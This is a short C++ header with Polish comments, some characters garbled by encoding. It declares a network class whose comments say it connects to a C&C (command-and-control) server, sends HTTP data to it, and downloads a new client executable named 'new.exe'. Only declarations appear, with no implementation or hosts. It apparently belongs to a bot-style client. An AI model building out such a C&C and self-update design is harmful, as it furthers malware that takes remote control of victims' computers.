#include "stdafx.h"

class NewConnection //Nowe po��czenie klienckie
{
public:
	SOCKET _socket = NULL; // Przyjmuje warto�� po wywo�aniu create_socket()

	bool run_winsock(); // Uruchom winsock 2.0

	SOCKET create_socket(); // Po��cz si� z C&C, zwraca uchwyt gniazda

	bool send_data(std::string http_query); // Wysy�a dane do serwera

	void close_socket(); //Niszczy gniazdo

	~NewConnection(); //Desktruktor gniazda
	
	bool DownloadNewClient(); // Zapisuje plik nowego klienta pod nazw� "new.exe"
};